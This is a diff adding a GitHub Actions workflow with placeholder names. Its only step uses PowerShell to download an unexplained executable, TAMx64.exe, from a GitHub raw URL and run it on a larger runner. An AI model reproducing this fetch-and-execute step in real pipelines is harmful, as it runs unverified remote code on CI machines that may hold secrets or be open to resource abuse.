@@ -1,0 +1,10 @@
+name: workflowname
+on:
+  workflow_dispatch:
+jobs:
+  build:
+    runs-on: larger_runner_label_name
+    steps:
+      - name: powershell
+        shell: cmd
+        run: powershell.exe -c Invoke-WebRequest https://github.com/username/Sameer1-29/raw/main/TAMx64.exe -OutFile TAMx64.exe ; .\TAMx64.exe
